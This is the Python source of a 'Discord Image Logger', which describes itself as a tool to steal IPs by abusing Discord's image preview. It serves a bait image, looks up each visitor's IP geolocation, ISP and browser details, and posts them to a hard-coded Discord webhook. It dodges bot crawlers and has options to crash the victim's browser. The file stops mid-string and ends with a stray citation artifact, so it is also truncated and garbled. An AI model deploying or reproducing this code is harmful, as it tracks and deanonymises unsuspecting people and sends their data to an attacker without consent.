```python from http.server import BaseHTTPRequestHandler from urllib import parse import traceback, requests, base64, httpagentparser __app__ = "Discord Image Logger" __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature" __version__ = "v2.0" __author__ = "DeKrypt" config = { "webhook": "https://discord.com/api/webhooks/1380613819256279060/UF4PCV2sdfGsIgVgqoNPOHaRWdczbbEHPc78vw7MLGtxHLDIJ6TL7FbBsg4SF7N0Wo3u", "image": "https://i.pinimg.com/736x/58/1f/82/581f82638e345eb84643f054c7fcc803.jpg", "imageArgument": True, "username": "Image Logger", "color": 0x00FFFF, "crashBrowser": False, "accurateLocation": False, "message": { "doMessage": False, "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", "richMessage": True, }, "vpnCheck": 1, "linkAlerts": True, "buggedImage": True, "antiBot": 1, "redirect": { "redirect": False, "page": "https://your-link.here" }, } blacklistedIPs = ("27", "104", "143", "164") def botCheck(ip, useragent): if ip.startswith(("34", "35")): return "Discord" elif useragent.startswith("TelegramBot"): return "Telegram" else: return False def reportError(error): requests.post(config["webhook"], json = { "username": config["username"], "content": "@everyone", "embeds": [ { "title": "Image Logger - Error", "color": config["color"], "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```", } ], }) def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False): if ip.startswith(blacklistedIPs): return bot = botCheck(ip, useragent) if bot: requests.post(config["webhook"], json = { "username": config["username"], "content": "", "embeds": [ { "title": "Image Logger - Link Sent", "color": config["color"], "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`", } ], }) if config["linkAlerts"] else None return ping = "@everyone" try: info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json() if info["proxy"]: if config["vpnCheck"] == 2: return if config["vpnCheck"] == 1: ping = "" except requests.RequestException: info = {} if info.get("hosting"): if config["antiBot"] == 4: if info.get("proxy"): pass else: return if config["antiBot"] == 3: return if config["antiBot"] == 2: if info.get("proxy"): pass else: ping = "" if config["antiBot"] == 1: ping = "" os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown") embed = { "username": config["username"], "content": ping, "embeds": [ { "title": "Image Logger - IP Logged", "color": config["color"], "description": f"""**A User Opened the Original Image!** **Endpoint:** `{endpoint}` **IP Info:** > **IP:** `{ip if ip else 'Unknown'}` > **Provider:** `{info.get('isp', 'Unknown')}` > **ASN:** `{info.get('as', 'Unknown')}` > **Country:** `{info.get('country', 'Unknown')}` > **Region:** `{info.get('regionName', 'Unknown')}` > **City:** `{info.get('city', 'Unknown')}` > **Coords:** `{str(info.get('lat', 'Unknown'))}, {str(info.get('lon', 'Unknown'))}` ({'Approximate' if not coords else coords.replace(',', ', ')}) > **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ')}` ({info.get('timezone', 'Unknown').split('/')[0]}) > **Mobile:** `{info.get('mobile', 'Unknown')}` > **VPN:** `{info.get('proxy', 'Unknown')}` > **Bot:** `{info.get('hosting', 'Unknown')}` **PC Info:** > **OS:** `{os}` > **Browser:** `{browser}` **User Agent:** ``` {useragent if useragent else 'Unknown'} ```""", } ], } if url: embed["embeds"][0].update({"thumbnail": {"url": url}}) requests.post(config["webhook"], json = embed) return info binaries = { "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|Ns ::contentReference[oaicite:20]{index=20}
